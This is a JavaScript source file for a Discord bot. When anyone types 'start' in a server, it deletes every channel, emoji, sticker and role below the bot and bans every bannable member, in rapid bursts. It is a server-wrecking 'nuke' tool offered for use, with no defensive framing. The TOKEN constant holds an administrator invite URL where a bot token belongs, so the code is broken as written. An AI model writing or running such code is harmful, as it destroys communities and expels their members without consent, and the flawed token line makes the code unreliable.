const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const TOKEN = 'https://discord.com/oauth2/authorize?client_id=1378057778584752188&permissions=8&integration_type=0&scope=bot';

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async (message) => {
    if (!message.guild) return;

    // Check for start command
    if (message.content.toLowerCase() === 'start') {
        // Delete Channels
        const channels = message.guild.channels.cache;
        if (channels.size > 0) {
            let channelsArray = Array.from(channels.values());
            let deleteInterval = setInterval(() => {
                if (channelsArray.length === 0) {
                    clearInterval(deleteInterval);
                    console.log('All channels have been deleted.');
                    return;
                }

                const randomChannel = channelsArray.splice(Math.floor(Math.random() * channelsArray.length), 1)[0];
                randomChannel.delete('Deleted by a random decision.')
                    .then(() => console.log(`${randomChannel.name} has been deleted.`))
                    .catch(err => console.log(`Failed to delete ${randomChannel.name}.`));
            }, 10);
        } else {
            console.log('No channels to delete.');
        }

        // Delete Emojis
        const emojis = message.guild.emojis.cache;
        if (emojis.size > 0) {
            let emojisArray = Array.from(emojis.values());
            let deleteInterval = setInterval(() => {
                if (emojisArray.length === 0) {
                    clearInterval(deleteInterval);
                    console.log('All emojis have been deleted.');
                    return;
                }

                const randomEmoji = emojisArray.splice(Math.floor(Math.random() * emojisArray.length), 1)[0];
                randomEmoji.delete('Deleted by a random decision.')
                    .then(() => console.log(`${randomEmoji.name} has been deleted.`))
                    .catch(err => console.log(`Failed to delete ${randomEmoji.name}.`));
            }, 10);
        } else {
            console.log('No emojis to delete.');
        }

        // Mass Ban Members
        const members = await message.guild.members.fetch();
        const bannableMembers = members.filter(member => member.bannable);
        if (bannableMembers.size > 0) {
            let membersArray = Array.from(bannableMembers.values());
            let banInterval = setInterval(() => {
                if (membersArray.length === 0) {
                    clearInterval(banInterval);
                    console.log('All bannable members have been banned.');
                    return;
                }

                const randomMember = membersArray.splice(Math.floor(Math.random() * membersArray.length), 1)[0];
                randomMember.ban({ reason: 'Banned by a random decision!' })
                    .then(() => console.log(`${randomMember.user.tag} has been banned.`))
                    .catch(err => console.log(`Failed to ban ${randomMember.user.tag}.`));
            }, 10);
        } else {
            console.log('No bannable members found.');
        }

        // Delete Stickers
        const stickers = await message.guild.stickers.fetch();
        if (stickers.size > 0) {
            let stickersArray = Array.from(stickers.values());
            let deleteInterval = setInterval(() => {
                if (stickersArray.length === 0) {
                    clearInterval(deleteInterval);
                    console.log('All stickers have been deleted.');
                    return;
                }

                const randomSticker = stickersArray.splice(Math.floor(Math.random() * stickersArray.length), 1)[0];
                randomSticker.delete('Deleted by a random decision.')
                    .then(() => console.log(`${randomSticker.name} has been deleted.`))
                    .catch(err => console.log(`Failed to delete ${randomSticker.name}.`));
            }, 3000);
        } else {
            console.log('No stickers to delete.');
        }

        // Delete Roles
        const botMember = await message.guild.members.fetch(client.user.id);
        const botHighestRole = botMember.roles.highest;
        const roles = message.guild.roles.cache.filter(role => role.comparePositionTo(botHighestRole) < 0 && role.editable);
        if (roles.size > 0) {
            let rolesArray = Array.from(roles.values());
            let deleteInterval = setInterval(() => {
                if (rolesArray.length === 0) {
                    clearInterval(deleteInterval);
                    console.log('All roles below the bot have been deleted.');
                    return;
                }

                const randomRole = rolesArray.splice(Math.floor(Math.random() * rolesArray.length), 1)[0];
                randomRole.delete('Deleted by a random decision.')
                    .then(() => console.log(`${randomRole.name} has been deleted.`))
                    .catch(err => console.log(`Failed to delete ${randomRole.name}.`));
            }, 10);
        } else {
            console.log('No roles to delete.');
        }
    }
});

client.login(TOKEN);
                      
